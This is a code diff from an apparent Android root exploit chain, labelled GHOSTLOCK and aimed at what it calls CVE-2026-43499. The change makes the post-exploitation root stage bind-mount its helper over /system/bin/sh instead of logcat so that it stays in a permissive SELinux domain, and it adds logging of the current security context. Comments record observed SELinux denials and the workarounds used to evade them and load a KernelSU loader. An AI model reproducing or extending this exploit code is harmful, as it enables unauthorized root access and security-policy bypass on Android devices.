@@ -7,6 +7,13 @@
 #define LOG_TAG "GHOSTLOCK"
 #define KSU_LOADER_PATH "/data/local/tmp/ksud"
 #define LOGCAT_PATH "/system/bin/logcat"
+/* Exec'ing a bind-mounted helper via logcat transitions the child into
+ * logcat's restricted SELinux domain (observed: helper could read
+ * /data/local/tmp but every write — markers, stdio file, .ksud-stage —
+ * was denied). /system/bin/sh keeps the parent domain, so the helper is
+ * bind-mounted over sh instead. ksud's own exec keeps the logcat path
+ * (that combination is what historically reached init_module). */
+#define SH_PATH "/system/bin/sh"
 #define LATE_LOAD_STATUS "/data/local/tmp/cve43499-late-load.status"
 /* Chain-level dry-run gate: hand off to nothing, report a successful root
  * stage so the pre-root helper's app-contract handshake can complete
@@ -226,6 +233,20 @@ int do_root_stage() {
   if (!helper || !*helper)
     helper = "/data/local/tmp/cve-2026-43499-root";
   if (access(helper, X_OK) == 0) {
+    /* Ground truth for the domain this handoff runs in. */
+    {
+      char dom[128] = "?";
+      int dfd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
+      if (dfd >= 0) {
+        ssize_t dn = read(dfd, dom, sizeof(dom) - 1);
+        close(dfd);
+        if (dn > 0) {
+          dom[dn] = '\0';
+          dom[strcspn(dom, "\r\n")] = '\0';
+        }
+      }
+      ghost_mark("root: handoff domain: %s", dom);
+    }
     /* load_policy above re-arms SELinux: this domain (vendor_modprobe) may
      * NOT exec shell_data_file directly — the denial lands at the cred
      * commit point of execve, which delivers SIGKILL (observed: helper
@@ -234,8 +255,8 @@ int do_root_stage() {
      * trick the inline ksud path already uses successfully. */
     if (unshare(CLONE_NEWNS) == 0 &&
         mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) == 0 &&
-        mount(helper, LOGCAT_PATH, NULL, MS_BIND, NULL) == 0) {
-      ghost_mark("root: KSU handoff via helper %s late-load (bind over logcat)",
+        mount(helper, SH_PATH, NULL, MS_BIND, NULL) == 0) {
+      ghost_mark("root: KSU handoff via helper %s late-load (bind over sh)",
           helper);
       pid_t h = fork();
       if (h == 0) {
@@ -250,7 +271,7 @@ int do_root_stage() {
           if (sfd > STDERR_FILENO)
             close(sfd);
         }
-        execl(LOGCAT_PATH, "cve-2026-43499-root", "late-load", (char *)NULL);
+        execl(SH_PATH, "cve-2026-43499-root", "late-load", (char *)NULL);
         ghost_mark("root: helper exec FAILED: %s", strerror(errno));
         _exit(13);
       }
